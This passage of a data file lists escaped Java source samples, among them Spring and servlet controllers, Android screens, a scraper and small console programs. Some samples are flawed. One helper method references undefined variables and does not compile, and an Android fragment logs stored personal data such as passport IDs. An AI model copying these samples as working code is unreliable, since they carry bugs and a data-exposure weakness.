\"\\\"adjLow\\\":97.4807376477,\\\"adjOpen\\\":98.259164644,\\\"adjVolume\\\":44060620,\\\"divCash\"\n      + \"\\\":0.0,\\\"splitFactor\\\":1.0}]\";\n\n  @Test\n  public void calculateExtrapolatedAnnualizedReturn()\n      throws Exception {\n    //given\n    String moduleToRun = null;\n    moduleToRun = \"REFACTOR\";\n\n    moduleToRun = \"ADDITIONAL_REFACTOR\";\n\n    if (moduleToRun.equals(\"REFACTOR\")) {\n      Mockito.doReturn(getCandles(aaplQuotes))\n          .when(portfolioManager).getStockQuote(eq(\"AAPL\"), any(), any());\n      Mockito.doReturn(getCandles(msftQuotes))\n          .when(portfolioManager).getStockQuote(eq(\"MSFT\"), any(), any());\n      Mockito.doReturn(getCandles(googlQuotes))\n          .when(portfolioManager).getStockQuote(eq(\"GOOGL\"), any(), any());\n    }\n    PortfolioTrade trade1 = new PortfolioTrade(\"AAPL\", 50, LocalDate.parse(\"2019-01-02\"));\n    PortfolioTrade trade2 = new PortfolioTrade(\"GOOGL\"",
    "import java.util.Scanner;\r\n\r\npublic class LinearEquation {\r\n    // Variabel-variabel untuk menyimpan koefisien persamaan linear\r\n    private double a, b, c, d, e, f;\r\n\r\n    // Constructor default\r\n    public LinearEquation() {\r\n        // Tidak ada yang perlu dilakukan di sini\r\n    }\r\n\r\n    // Metode untuk mendapatkan nilai koefisien a\r\n    public double getA() {\r\n        return a;\r\n    }\r\n\r\n    // Metode untuk mendapatkan nilai koefisien b\r\n    public double getB() {\r\n        return b;\r\n    }\r\n\r\n    // Metode untuk mendapatkan nilai koefisien c\r\n    public double getC() {\r\n        return c;\r\n    }\r\n\r\n    // Metode untuk mendapatkan nilai koefisien d\r\n    public double getD() {\r\n        return d;\r\n    }\r\n\r\n    // Metode untuk mendapatkan nilai koefisien e\r\n    public double getE() {\r\n        return e;\r\n    }\r\n\r\n    // Metode untuk mendapatkan nilai koefisien f\r\n    public double getF() {\r\n        return f;\r\n    }\r\n\r\n    // Metode untuk mengatur koefisien persamaan linear\r\n    public void setCoefficients(double a, double b, double c, double d, double e, double f) {\r\n        this.a = a;\r\n        this.b = b;\r\n        this.c = c;\r\n        this.d = d;\r\n        this.e = e;\r\n        this.f = f;\r\n    }\r\n\r\n    // Metode untuk memeriksa apakah persamaan dapat diselesaikan\r\n    public boolean isSolvable() {\r\n        // Persamaan dapat diselesaikan jika determinan tidak sama dengan 0\r\n        return (a * d - b * c) != 0;\r\n    }\r\n\r\n    // Metode untuk menghitung dan mengembalikan nilai x\r\n    public double getX() {\r\n        return (e * d - b * f) / (a * d - b * c);\r\n    }\r\n\r\n    // Metode untuk menghitung dan mengembalikan nilai y\r\n    public double getY() {\r\n        return (a * f - e * c) / (a * d - b * c);\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        Scanner input = new Scanner(System.in);\r\n\r\n        // Meminta pengguna untuk memasukkan nilai koefisien persamaan\r\n        System.out.println(\"Masukkan nilai koefisien untuk persamaan linear (ax + by = e, cx + dy = f):\");\r\n        double a = input.nextDouble();\r\n        double b = input.nextDouble();\r\n        double c = input.nextDouble();\r\n        double d = input.nextDouble();\r\n        double e = input.nextDouble();\r\n        double f = input.nextDouble();\r\n\r\n        // Membuat objek persamaan linear\r\n        LinearEquation linearEquation = new LinearEquation();\r\n        linearEquation.setCoefficients(a, b, c, d, e, f);\r\n\r\n        // Memeriksa apakah persamaan dapat diselesaikan\r\n        if (linearEquation.isSolvable()) {\r\n            // Jika persamaan dapat diselesaikan, mencetak solusi ke layar\r\n            System.out.println(\"Solusi dari persamaan linear:\");\r\n            System.out.println(\"x = \" + linearEquation.getX());\r\n            System.out.println(\"y = \" + linearEquation.getY());\r\n        } else {\r\n            // Jika persamaan tidak dapat diselesaikan, mencetak pesan ke layar\r\n            System.out.println(\"Persamaan tidak memiliki solusi.\");\r\n        }\r\n\r\n        // Menutup objek Scanner\r\n        input.close();\r\n    }\r\n}\r\n",
    "package com.tipsy.bean.controller;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.CrossOrigin;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport com.tipsy.bean.ApiResponse;\nimport com.tipsy.bean.UserDetailResponse;\nimport com.tipsy.bean.UserLoginRequest;\nimport com.tipsy.bean.UserRegistrationRequest;\nimport com.tipsy.service.UserService;\n\n@RestController\n@RequestMapping(\"/user\")\npublic class UserController {\n\t\n\t@Autowired\n\tprivate UserService userService;\n\t\n\t@PostMapping(\"/register\")\n\t@CrossOrigin\n\tpublic ResponseEntity<ApiResponse> register(@RequestBody UserRegistrationRequest registrationRequest){\n\t\tString response = userService.register(registrationRequest);\n\t\treturn ResponseEntity.status(HttpStatus.CREATED).body(new ApiResponse().setStatus(\"Success\").setPayload(response));\n\t}\n\t\n\t@PostMapping(\"/login\")\n\t@CrossOrigin\n\tpublic ResponseEntity<ApiResponse> login(@RequestBody UserLoginRequest loginRequest){\n\t\tString response = userService.login(loginRequest);\n\t\treturn ResponseEntity.status(HttpStatus.CREATED).body(new ApiResponse().setStatus(\"Success\").setPayload(response));\n\t}\n\t\n\t@GetMapping(\"/get\")\n\t@CrossOrigin\n\tpublic ResponseEntity<ApiResponse> getUserDetails(@RequestParam String email){\n\t\tUserDetailResponse userDetailResponse = userService.getUser(email);\n\t\treturn ResponseEntity.status(HttpStatus.OK).body(new ApiResponse().setStatus(\"Success\").setPayload(userDetailResponse));\n\t}\n\n}\n",
    "package com.example.med;\n\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.SharedPreferences;\nimport android.database.Cursor;\nimport android.os.Bundle;\n\nimport androidx.annotation.NonNull;\nimport androidx.fragment.app.Fragment;\n\nimport android.util.Log;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.Button;\nimport android.widget.TextView;\n\nimport java.util.Map;\n\npublic class profileFragmentDoctor extends Fragment {\n\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        View view = inflater.inflate(R.layout.fragment_profile_doctor, container, false);\n        SharedPreferences sharedPreferences = getActivity().getSharedPreferences(\"data\", Context.MODE_PRIVATE);\n        String passportId = sharedPreferences.getString(\"passportId\", \"\");\n        String fullName = sharedPreferences.getString(\"fullName\", \"\");\n\n        Button logoutButton = view.findViewById(R.id.logoutButton);\n\n        logoutButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                SharedPreferences.Editor editor = sharedPreferences.edit();\n                editor.clear();\n                editor.commit();\n                Intent intent = new Intent(getActivity(), MainActivity.class);\n                startActivity(intent);\n                getActivity().finish();\n            }\n        });\n\n        return view;\n\n    }\n\n    @Override\n    public void onViewCreated(@NonNull View view, Bundle savedInstanceState) {\n        super.onViewCreated(view, savedInstanceState);\n\n        long epochTimeSeconds = System.currentTimeMillis() / 1000;\n        Log.d(\"MainActivity\", \"\u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u0432\u0440\u0435\u043c\u044f \u0432 \u0444\u043e\u0440\u043c\u0430\u0442\u0435 epoch time: \" + epochTimeSeconds);\n\n        SharedPreferences sharedPreferences = getActivity().getSharedPreferences(\"data\", Context.MODE_PRIVATE);\n        Map<String, ?> allEntries = sharedPreferences.getAll();\n        for (Map.Entry<String, ?> entry : allEntries.entrySet()) {\n            Log.d(\"SharedPreferences\", entry.getKey() + \": \" + entry.getValue().toString());\n        }\n        String fullName = sharedPreferences.getString(\"fullName\", \"\");\n\n        TextView passportTextView = view.findViewById(R.id.passportTextView);\n        TextView adressTextView = view.findViewById(R.id.adressTextView);\n        TextView fullnameTextView = view.findViewById(R.id.fullnameTextView);\n        TextView areaTextView = view.findViewById(R.id.areaTextView);\n        TextView statusTextView = view.findViewById(R.id.statusTextView);\n\n        Button logoutButton = view.findViewById(R.id.logoutButton);\n\n        DBHelper dbHelper = new DBHelper(getActivity());\n        Cursor cursor = dbHelper.getUserByFullName(fullName);\n\n        if (cursor.moveToFirst()) {\n            String statusText;\n\n            String passportId = cursor.getString(cursor.getColumnIndexOrThrow(DBHelper.COLUMN_PASSPORT_ID));\n            String address = cursor.getString(cursor.getColumnIndexOrThrow(DBHelper.COLUMN_ADDRESS));\n            String fullname = cursor.getString(cursor.getColumnIndexOrThrow(DBHelper.COLUMN_FULL_NAME));\n            String area = cursor.getString(cursor.getColumnIndexOrThrow(DBHelper.COLUMN_AREA));\n            String id = cursor.getString(cursor.getColumnIndexOrThrow(DBHelper.COLUMN_ID));\n            SharedPreferences.Editor editor = sharedPreferences.edit();\n            editor.putString(\"area\", area);\n            editor.putString(\"id\", id);\n            editor.apply();\n\n            int statusInt = cursor.getInt(cursor.getColumnIndexOrThrow(DBHelper.COLUMN_IS_DOCTOR));\n\n            if (statusInt == 0) {\n                statusText = \"\u041f\u0430\u0446\u0438\u0435\u043d\u0442\";\n            } else if (statusInt == 1) {\n                statusText = \"\u0414\u043e\u043a\u0442\u043e\u0440\";\n            } else if (statusInt == 2) {\n                statusText = \"\u0421\u043f\u0440\u0430\u0432\u043a\u0430\";\n            } else {\n                statusText = \"\u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0439 \u0441\u0442\u0430\u0442\u0443\u0441\";\n            }\n\n            passportTextView.setText(\"\u0418\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u043e\u043d\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440: \"+passportId);\n            adressTextView.setText(\"\u0410\u0434\u0440\u0435\u0441\u0441: \"+address);\n            fullnameTextView.setText(\"\u0424\u0418\u041e: \"+fullname);\n            areaTextView.setText(\"\u0423\u0447\u0430\u0441\u0442\u043e\u043a: \"+area);\n            statusTextView.setText(\"\u0421\u0442\u0430\u0442\u0443\u0441: \" + statusText);\n        }\n\n        logoutButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                SharedPreferences.Editor editor = sharedPreferences.edit();\n                editor.clear();\n                editor.apply();\n                Intent intent = new Intent(getActivity(), MainActivity.class);\n                startActivity(intent);\n                getActivity().finish();\n            }\n        });\n\n        cursor.close();\n    }\n\n\n}\n",
    "package org.example;\n\npublic class User {\n    private int id;\n    private String name;\n    private String username;\n    private String email;\n    private Address address;\n    private String phone;\n    private String website;\n    private Company company;\n    public User() {}\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getUsername() {\n        return username;\n    }\n\n    public void setUsername(String username) {\n        this.username = username;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    public Address getAddress() {\n        return address;\n    }\n\n    public void setAddress(Address address) {\n        this.address = address;\n    }\n\n    public String getPhone() {\n        return phone;\n    }\n\n    public void setPhone(String phone) {\n        this.phone = phone;\n    }\n\n    public String getWebsite() {\n        return website;\n    }\n\n    public void setWebsite(String website) {\n        this.website = website;\n    }\n\n    public Company getCompany() {\n        return company;\n    }\n\n    public void setCompany(Company company) {\n        this.company = company;\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                \", username='\" + username + '\\'' +\n                \", email='\" + email + '\\'' +\n                \", address=\" + address +\n                \", phone='\" + phone + '\\'' +\n                \", website='\" + website + '\\'' +\n                \", company=\" + company +\n                '}';\n    }\n}\n\nclass Address {\n    private String street;\n    private String suite;\n    private String city;\n    private String zipcode;\n    private Geo geo;\n\n    public Address() {}\n\n    public String getStreet() {\n        return street;\n    }\n\n    public void setStreet(String street) {\n        this.street = street;\n    }\n\n    public String getSuite() {\n        return suite;\n    }\n\n    public void setSuite(String suite) {\n        this.suite = suite;\n    }\n\n    public String getCity() {\n        return city;\n    }\n\n    public void setCity(String city) {\n        this.city = city;\n    }\n\n    public String getZipcode() {\n        return zipcode;\n    }\n\n    public void setZipcode(String zipcode) {\n        this.zipcode = zipcode;\n    }\n\n    public Geo getGeo() {\n        return geo;\n    }\n\n    public void setGeo(Geo geo) {\n        this.geo = geo;\n    }\n\n    @Override\n    public String toString() {\n        return \"Address{\" +\n                \"street='\" + street + '\\'' +\n                \", suite='\" + suite + '\\'' +\n                \", city='\" + city + '\\'' +\n                \", zipcode='\" + zipcode + '\\'' +\n                \", geo=\" + geo +\n                '}';\n    }\n}\n\nclass Geo {\n    private String lat;\n    private String lng;\n\n    public Geo() {}\n\n    public String getLat() {\n        return lat;\n    }\n\n    public void setLat(String lat) {\n        this.lat = lat;\n    }\n\n    public String getLng() {\n        return lng;\n    }\n\n    public void setLng(String lng) {\n        this.lng = lng;\n    }\n\n    @Override\n    public String toString() {\n        return \"Geo{\" +\n                \"lat='\" + lat + '\\'' +\n                \", lng='\" + lng + '\\'' +\n                '}';\n    }\n}\n\nclass Company {\n    private String name;\n    private String catchPhrase;\n    private String bs;\n\n    public Company() {\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getCatchPhrase() {\n        return catchPhrase;\n    }\n\n    public void setCatchPhrase(String catchPhrase) {\n        this.catchPhrase = catchPhrase;\n    }\n\n    public String getBs() {\n        return bs;\n    }\n\n    public void setBs(String bs) {\n        this.bs = bs;\n    }\n\n    @Override\n    public String toString() {\n        return \"Company{\" +\n                \"name='\" + name + '\\'' +\n                \", catchPhrase='\" + catchPhrase + '\\'' +\n                \", bs='\" + bs + '\\'' +\n                '}';\n    }\n}",
    "package com.company;\r\nimport java.util.Scanner;\r\nimport java.util.Random;\r\n\r\npublic class Main {\r\n\r\n    public static void main(String[] args) {\r\n\t// write your code here\r\n        Scanner sc=new Scanner(System.in);\r\n        System.out.println(\"Enter 0 for rock , 1 for paper & 2 for scissor \");\r\n        int user= sc.nextInt();\r\n        Random r= new Random();\r\n        int comp= r.nextInt(3);\r\n        if(user ==0 && comp==2 || user==1&& comp==0 || user==2 && comp==0){\r\n            System.out.println(\"You won \");\r\n        }\r\n        else if (user==0 && comp==0 || user == 1 && comp==1 || user==2 && comp==2){ //or we can use (user==comp) in the condition part of the      else if       statement\r\n            System.out.println(\"Game Draw\");\r\n        }\r\n        else{\r\n            System.out.println(\"You lose \");\r\n        }\r\n        if (comp==0)\r\n            System.out.println(\"computer choose : Rock\");\r\n        else if (comp==1)\r\n            System.out.println(\"computer choose : Paper\");\r\n        else\r\n            System.out.println(\"computer choose : Scissor\");\r\n    }\r\n}\r\n",
    "import org.apache.poi.ss.usermodel.*;\r\nimport org.apache.poi.xssf.usermodel.XSSFWorkbook;\r\nimport org.openqa.selenium.By;\r\nimport org.openqa.selenium.WebDriver;\r\nimport org.openqa.selenium.WebElement;\r\nimport org.openqa.selenium.chrome.ChromeDriver;\r\n\r\nimport java.io.FileInputStream;\r\nimport java.io.IOException;\r\nimport java.util.HashMap;\r\nimport java.util.Iterator;\r\nimport java.util.Map;\r\n\r\npublic class StockPriceValidation {\r\n\r\n    public static void main(String[] args) throws IOException {\r\n        // Read data from XLS file and store in HashMap1\r\n        Map<String, Double> hashMap1 = readFromXLS(\"stock_prices.xlsx\");\r\n\r\n        // Read data from website using Selenium WebDriver and store in HashMap2\r\n        WebDriver driver = new ChromeDriver();\r\n        driver.get(\"https://money.rediff.com/losers/bse/daily/groupall\");\r\n\r\n        Map<String, Double> hashMap2 = new HashMap<>();\r\n        WebElement table = driver.findElement(By.xpath(\"//table[@class='dataTable']\"));\r\n        for (WebElement row : table.findElements(By.tagName(\"tr\"))) {\r\n            String stockName = row.findElement(By.xpath(\".//td[1]\")).getText();\r\n            String priceStr = row.findElement(By.xpath(\".//td[2]\")).getText();\r\n            double price = Double.parseDouble(priceStr.replaceAll(\"[^0-9.]\", \"\"));\r\n            hashMap2.put(stockName, price);\r\n        }\r\n        driver.quit();\r\n\r\n        // Compare values stored in the two HashMaps\r\n        for (String key : hashMap1.keySet()) {\r\n            if (!hashMap2.containsKey(key)) {\r\n                System.out.println(\"Stock not found on website: \" + key);\r\n            } else {\r\n                double price1 = hashMap1.get(key);\r\n                double price2 = hashMap2.get(key);\r\n                if (price1 != price2) {\r\n                    System.out.println(\"Price mismatch for \" + key + \": Expected \" + price1 + \", Actual \" + price2);\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    private static Map<String, Double> readFromXLS(String filePath) throws IOException {\r\n        Map<String, Double> map = new HashMap<>();\r\n        FileInputStream fis = new FileInputStream(filePath);\r\n        Workbook workbook = new XSSFWorkbook(fis);\r\n        Sheet sheet = workbook.getSheetAt(0);\r\n\r\n        Iterator<Row> iterator = sheet.iterator();\r\n        while (iterator.hasNext()) {\r\n            Row currentRow = iterator.next();\r\n            String stockName = currentRow.getCell(0).getStringCellValue();\r\n            double price = currentRow.getCell(1).getNumericCellValue();\r\n            map.put(stockName, price);\r\n        }\r\n\r\n        workbook.close();\r\n        fis.close();\r\n        return map;\r\n    }\r\n}",
    "package com.ssafy.mem.controller;\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.List;\n\nimport com.ssafy.mem.model.dto.MemDto;\nimport com.ssafy.mem.model.service.MemService;\nimport com.ssafy.mem.model.service.MemServiceImpl;\nimport com.ssafy.tv.model.dto.TvDto;\nimport com.ssafy.tv.model.service.TvService;\nimport com.ssafy.tv.model.service.TvServiceImpl;\n\nimport jakarta.servlet.RequestDispatcher;\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.annotation.WebServlet;\nimport jakarta.servlet.http.Cookie;\nimport jakarta.servlet.http.HttpServlet;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport jakarta.servlet.http.HttpSession;\n\n@WebServlet(\"/member\")\npublic class MemController extends HttpServlet{\n\nprivate MemService service;\n\t\n\t@Override\n\tpublic void init() throws ServletException {\n\t\tservice = MemServiceImpl.getInstance();\n\t}\n\n\t@Override\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\tprocess(request, response);\n\t}\n\t\n\t@Override\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\trequest.setCharacterEncoding(\"utf-8\");\n\t\tprocess(request, response);\n\t}\n\t\n\tprotected void process(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\tString action = request.getParameter(\"action\");\n\t\tString path = \"\";\n\t\tif(action.equals(\"mvlogin\")) {\n\t\t\tpath = \"/login.jsp\";\n\t\t\tredirect(request, response, path);\n\t\t} else if(action.equals(\"login\")) {\n\t\t\tpath = login(request, response);\n\t\t\tforward(request, response, path);\n\t\t} else if(action.equals(\"logout\")) {\n\t\t\tpath = logout(request, response);\n\t\t\tredirect(request, response, path);\n\t\t} else if(action.equals(\"mvjoin\")) {\n\t\t\tpath = \"/join.jsp\";\n\t\t\tredirect(request, response, path);\n\t\t} else if(action.equals(\"join\")) {\n\t\t\tpath = join(request, response);\n\t\t\tredirect(request, response, path);\n\t\t} else if(action.equals(\"idcheck\")) {\n\t\t\tidcheck(request, response);\n\t\t} else {\n\t\t\tpath = \"\";\n\t\t\tredirect(request, response, path);\n\t\t}\n//\t\tforward(request, response, path);\n//\t\tredirect(request, response, path);\n\t}\n\n\n\tprivate void idcheck(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\tString id = request.getParameter(\"id\");\n\t\ttry {\n\t\t\tboolean flag = service.check(id);\n\t\t\tresponse.setContentType(\"text/plain\");\n\t\t\tresponse.setCharacterEncoding(\"utf-8\");\n\t\t\tPrintWriter writer = response.getWriter();\n\t\t\tif(flag) { // id\uc911\ubcf5\n\t\t\t\twriter.write(\"\uc911\ubcf5\ub41c \uc544\uc774\ub514\");\n\t\t\t} else { // \uc911\ubcf5 \uc5c6\uc74c\n\t\t\t\twriter.write(\"\uac00\ub2a5\ud78c \uc544\uc774\ub514\");\n\t\t\t}\n\t\t} catch (Exception e) {\n\t\t\t// TODO: handle exception\n\t\t}\n\t\t\n\t\tresponse.sendRedirect(request.getContextPath() + \"/join.jsp\");\n\t}\n\n\tprivate String join(HttpServletRequest request, HttpServletResponse response) {\n\t\tString id = request.getParameter(\"id\");\n\t\tString pw = request.getParameter(\"pw\");\n\t\tString name = request.getParameter(\"name\");\n\t\tInteger age = Integer.valueOf(request.getParameter(\"age\"));\n\t\tMemDto dto = new MemDto(id, pw, name, age);\n\t\ttry {\n\t\t\tservice.join(dto);\n\t\t\treturn \"/login.jsp\";\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t\treturn \"/error.jsp\";\n\t\t}\n\t}\n\n\tprivate String logout(HttpServletRequest request, HttpServletResponse response) {\n\t\ttry {\n\t\t\tHttpSession session = request.getSession();\n\t\t\tsession.invalidate();\n\t\t\treturn \"/index.jsp\";\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t\treturn \"/error.jsp\";\n\t\t}\n\t}\n\n\tprivate String login(HttpServletRequest request, HttpServletResponse response) {\n\t\ttry {\n\t\t\tString id = request.getParameter(\"id\");\n\t\t\tString pw = request.getParameter(\"password\");\n\t\t\tMemDto dto = service.login(id, pw);\n\t\t\tif(dto != null) { // \ub85c\uadf8\uc778 \uc131\uacf5\n\t\t\t\tHttpSession session = request.getSession();\n\t\t\t\tsession.setAttribute(\"memberDto\", dto);\n\t\t\t\tString remember = request.getParameter(\"remember\");\n\t\t\t\tif(remember != null) {\n\t\t\t\t\tCookie cookie1 = new Cookie(\"rememberID\", dto.getId());\n\t\t\t\t\tcookie1.setPath(request.getContextPath());\n\t\t\t\t\tcookie1.setMaxAge(60*60*24*365);\n\t\t\t\t\tresponse.addCookie(cookie1);\n\t\t\t\t\t\n\t\t\t\t\tCookie cookie2 = new Cookie(\"check\", \"checked\");\n\t\t\t\t\tcookie2.setPath(request.getContextPath());\n\t\t\t\t\tcookie2.setMaxAge(60*60*24*365);\n\t\t\t\t\tresponse.addCookie(cookie2);\n\t\t\t\t} else {\n\t\t\t\t\tCookie cookie1 = new Cookie(\"rememberID\", dto.getId()); // \uc544\uc774\ub514 \uc800\uc7a5\n\t\t\t\t\tcookie1.setPath(request.getContextPath());\n\t\t\t\t\tcookie1.setMaxAge(0);\n\t\t\t\t\tresponse.addCookie(cookie1);\n\t\t\t\t\t\n\t\t\t\t\tCookie cookie2 = new Cookie(\"check\", \"checked\"); // \uc544\uc774\ub514 \uae30\uc5b5\n\t\t\t\t\tcookie2.setPath(request.getContextPath());\n\t\t\t\t\tcookie2.setMaxAge(0);\n\t\t\t\t\tresponse.addCookie(cookie2);\n\t\t\t\t}\n\t\t\t\treturn \"/index.jsp\";\n\t\t\t} else {\n\t\t\t\treturn \"/login.jsp\";\n\t\t\t}\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t\treturn \"/error.jsp\";\n\t\t}\n\t}\n\n\tprivate void redirect(HttpServletRequest request, HttpServletResponse response, String path) throws ServletException, IOException{\n\t\treques",
    "package ca.projectbes.chatmanagement.controller;\n\nimport java.util.ArrayList;\nimport java.util.concurrent.atomic.AtomicLong;\n\nimport ca.projectbes.chatmanagement.datatransfer.*;\nimport ca.projectbes.chatmanagement.model.ChatUserModel;\nimport ca.projectbes.chatmanagement.model.UserChatModel;\nimport ca.projectbes.chatmanagement.service.ChatUserService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.CrossOrigin;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport static org.springframework.web.bind.annotation.RequestMethod.*;\n\n@CrossOrigin(origins = \"*\")\n@RestController\npublic class ChatUserController {\n    private final String baseurl = \"/rest/fanlinc/chatmanagement\";\n\n    @Autowired\n    private ChatUserService chatUserService;\n\n    /**\n     * Adds a user to a given chat.\n     *\n     * @param addUserForm is the request body.\n     * @return a chat user object.\n     */\n    @RequestMapping(value=baseurl + \"/user\", method=PUT)\n    public ChatUserModel addUser(@RequestBody AddUserForm addUserForm) {\n        return chatUserService.addUser(addUserForm);\n    }\n\n    /**\n     * Removes a user from a given chat.\n     *\n     * @param removeUserForm is the request body.\n     * @return a chat user object.\n     */\n    @RequestMapping(value=baseurl + \"/user\", method=DELETE)\n    public ChatUserModel removeUser(@RequestBody RemoveUserForm removeUserForm) {\n        return chatUserService.removeUser(removeUserForm);\n    }\n\n    /**\n     * Get a list of users in a given chat.\n     *\n     * @param getChatForm is the request body format.\n     * @return A ChatUser object containing a list of users.\n     */\n    @RequestMapping(value=baseurl + \"/all_users\", method=GET)\n    public ChatUserModel getAllUser(@RequestBody GetChatForm getChatForm) {\n        return chatUserService.getAllUser(getChatForm);\n    }\n\n\n    /**\n     * Gets a list of chats that a given user is part of.\n     *\n     * @param getUserForm is the request body format\n     * @return A UserChat object containing a list of chats.\n     */\n    @RequestMapping(value=baseurl + \"/all_user_chats\", method=GET)\n    public UserChatModel getAllUserChats(@RequestBody GetUserForm getUserForm) {\n        return chatUserService.getAllUserChats(getUserForm);\n    }\n}",
    "package com.myapplication;\n\nimport android.content.Context;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.TextView;\n\nimport androidx.annotation.NonNull;\nimport androidx.recyclerview.widget.RecyclerView;\n\nimport java.util.List;\n\npublic class TaskAdapter extends RecyclerView.Adapter<TaskAdapter.TaskViewHolder> {\n    private Context context;\n    private List<TaskModel> taskList;\n    private OnTaskClickListener listener;\n\n    public interface OnTaskClickListener {\n        void onUpdateClick(int position);\n        void onDeleteClick(int position);\n\n        void onTaskClick(TaskModel task);\n    }\n\n    public TaskAdapter(Context context, List<TaskModel> taskList, OnTaskClickListener listener) {\n        this.context = context;\n        this.taskList = taskList;\n        this.listener = listener;\n    }\n\n    @NonNull\n    @Override\n    public TaskViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        View view = LayoutInflater.from(context).inflate(R.layout.task_item, parent, false);\n        return new TaskViewHolder(view);\n    }\n\n    @Override\n    public void onBindViewHolder(@NonNull TaskViewHolder holder, int position) {\n        TaskModel task = taskList.get(position);\n        holder.taskNameTextView.setText(task.getName());\n\n        holder.itemView.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Implement click listener to update or delete task\n                listener.onUpdateClick(position);\n            }\n        });\n\n        holder.itemView.setOnLongClickListener(new View.OnLongClickListener() {\n            @Override\n            public boolean onLongClick(View v) {\n                listener.onDeleteClick(position);\n                return true;\n            }\n        });\n    }\n\n    @Override\n    public int getItemCount() {\n        return taskList.size();\n    }\n\n    public static class TaskViewHolder extends RecyclerView.ViewHolder {\n        TextView taskNameTextView;\n\n        public TaskViewHolder(@NonNull View itemView) {\n            super(itemView);\n            taskNameTextView = itemView.findViewById(R.id.taskNameTextView);\n        }\n    }\n}\n\n",
    "import java.util.Scanner;\r\n\r\npublic class bonusCalculator {\r\n    public static void main(String[] args) {\r\n        Scanner scanner = new Scanner(System.in);\r\n\r\n        // Taking input for current year and year of joining\r\n        System.out.print(\"Enter the current year: \");\r\n        int currentYear = scanner.nextInt();\r\n        System.out.print(\"Enter the year of joining: \");\r\n        int joiningYear = scanner.nextInt();\r\n\r\n        // Calculating years of service\r\n        int yearsOfService = currentYear - joiningYear;\r\n\r\n        // Checking eligibility for bonus\r\n        if (yearsOfService > 5) {\r\n            System.out.println(\"Congratulations! You have ser2024ved for more than 5 years. You are eligible for a bonus of Rs. 5000/-\");\r\n        } else if (yearsOfService >= 3 && yearsOfService <= 5) {\r\n            System.out.println(\"Congratulations! You have served for \" + yearsOfService + \" years. You are eligible for a bonus of Rs. 3000/-\");\r\n        } else {\r\n            System.out.println(\"Sorry, you are not eligible for a bonus. Keep up the good work!\");\r\n        }\r\n\r\n        scanner.close();\r\n    }\r\n}\r\n",
    "package com.example.restful_demo;\n//imports\n\n@RestController\n@RequestMapping(\"/api/books\")\npublic class BookController {\n    private final List<Book> books = new ArrayList<Book>();\n\n    @GetMapping\n    public List<Book> getAllBooks() {\n        return books;\n    }\n\n\n    @GetMapping(\"/{id}\")\n    public Book getBookById(@PathVariable Long id) {\n        return findBookById(id);\n    }\n\n\n    @PostMapping\n    public Book addBook(@RequestBody Book book) {\n        book.setId(generateBookId());\n        books.add(book);\n        return book;\n    }\n\n\n    @PutMapping(\"/{id}\")\n    public Book updateBook(@PathVariable Long id, @RequestBody Book updatedBook) {\n        Book existingBook = findBookById(id);\n\n        if (existingBook != null) {\n            existingBook.setTitle(updatedBook.getTitle());\n            existingBook.setAuthor(updatedBook.getAuthor());\n            existingBook.setPublicationYear(updatedBook.getPublicationYear());\n        }\n        return existingBook;\n    }\n\n\n    @DeleteMapping(\"/{id}\")\n    public void deleteBook(@PathVariable Long id) {\n        Book bookToRemove = findBookById(id);\n        if (bookToRemove != null) {\n            books.remove(bookToRemove);\n        }\n    }\n\n\n    // Helper method to find a book by ID\n    private Book findBookById(Long id) {\n        for(Person p:al) {\n\t\tif(p.getName().equalsIgnoreCase(name)) {\n\t\t\treturn p;\n\t\t}else {\n\t\t\treturn null;\n\t\t}\n\t}\n    }\n}\n\n\n\n",
